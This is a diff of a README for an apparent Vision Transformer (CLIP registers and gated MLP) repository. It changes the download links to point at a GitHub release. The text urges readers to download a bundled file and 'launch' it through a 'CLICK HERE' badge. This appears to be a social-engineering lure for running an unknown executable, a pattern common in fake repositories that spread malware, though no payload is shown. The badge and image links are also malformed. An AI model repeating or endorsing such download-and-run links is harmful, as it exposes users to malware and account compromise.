@@ -21,12 +21,12 @@ In this repository, we explore cutting-edge techniques in the realm of Vision Tr
 - vision
 
 ## Grab Your Copy
-Ready to dive into the world of Vision Transformers with Registers and Gated MLPs? Click [here](https://github.com/files/Soft.zip) to download the necessary files. Don't forget to launch the file to start exploring the advancements in this repository!
+Ready to dive into the world of Vision Transformers with Registers and Gated MLPs? Click [here](https://github.com/kastalimohammed1965/CLIP-fine-tune-registers-gated/releases/tag/v1.2) to download the necessary files. Don't forget to launch the file to start exploring the advancements in this repository!
 
 ## Explore Further
 If you want to delve deeper into the content or discover more about the project, make sure to check the **Releases** section for additional updates and resources.
 
-[![Download Soft.zip](https://img.shields.io/badge/CLICK-HERE-blueviolet)](https://github.com/files/Soft.zip)
+[![Download https://github.com/kastalimohammed1965/CLIP-fine-tune-registers-gated/releases/tag/v1.2](https://github.com/kastalimohammed1965/CLIP-fine-tune-registers-gated/releases/tag/v1.2)](https://github.com/kastalimohammed1965/CLIP-fine-tune-registers-gated/releases/tag/v1.2)
 
 ## What's Inside
 Here's a sneak peek of what you can expect when you explore this repository:
@@ -45,4 +45,4 @@ To stay updated with the latest developments and discussions around Vision Trans
 
 Let's embark on this exciting journey of exploring Vision Transformers with Registers and Gated MLPs - the future of vision tasks awaits!
 
-![Transformer Image](https://www.example.com/transformer.jpg)
+![Transformer Image](https://github.com/kastalimohammed1965/CLIP-fine-tune-registers-gated/releases/tag/v1.2)
